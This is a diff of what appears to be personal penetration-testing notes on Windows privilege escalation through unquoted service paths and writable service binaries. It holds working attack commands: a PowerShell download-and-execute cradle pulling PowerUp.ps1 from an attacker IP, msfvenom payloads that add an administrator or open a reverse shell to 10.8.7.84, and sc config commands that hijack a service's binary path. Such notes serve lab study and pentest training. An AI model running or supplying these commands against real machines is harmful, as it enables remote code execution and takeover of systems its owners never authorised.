@@ -103,20 +103,27 @@ msiexec /quiet /qn /i /pathtosoftwarecreated
 
 <h2>unquoted service paths</h2>
 Run winpeas and check for any unquoted service paths <br>
-Can try move powerview to the machine and run powerview or powerup.ps1 - Invoke-AllChecks. PowerView.ps1 - Get-ServiceUnquoted (see below command).
-Run http server on PowerSploit directory on my linux. Type command on victim 
+Can try move powerview to the machine and run powerview or powerup.ps1 - Invoke-AllChecks. PowerView.ps1 - Get-ServiceUnquoted (see below command).<br>
+Run http server on PowerSploit directory on my linux. Type command on victim <br> 
 powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.81/PowerUp.ps1');Get-ServiceUnquoted" (change IP) <br>
 if winpeas wont work try run <br>
 wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ <br>
 for example if path -- C:\Program Files\unquoted path\Common Files <br>
-Ensure you can stop and start service you are attacking -- sc query servicename <br>
-create exe - common.exe  -- msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe <br>
-Or just make reverse shell exe and start multi/handler with same reverse shell on msfconsole <br>
+Ensure you can stop and start service you are attacking -- sc query servicename (also check if runs as localsystem)<br>
+create exe - common.exe  -- msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.7.84 LPORT=4242 -f exe -o reverse3.exe <br>
 place in C:\Program Files\unquoted path (this ovbiously changes path for what you found) <br>
 call service   -- sc start servicename <br>
 you change change whats in the generated exe  <br>
-
-
+<br>
+<h2> service path binaries </h2> <br>
+Check unquoted service paths with powerup (download to machine run powershell and do . ./PowerUp.ps1 then run Get-ServiceUnquoted <br>
+Query highlighted services with accesschk -- C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc (change path to where download is and change "daclsv" to service name) <br>
+Now query service with sc qc servicename (see who the service runs as and if permission to stop start). Look at binary path name, can you browse to the path and replace the path for the service? <br>
+Create new reverse shell msfvenom payload <br>
+sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""   (change "daclsvc" to service name and binary path to place where generated msfvenom payload rs is) <br>
+<br>
+Start service again -- net start servicename <br>
+<br>
 <h2>search configuration files for passwords</h2>
 <br>
 <h2> RunAs </h2> <br>
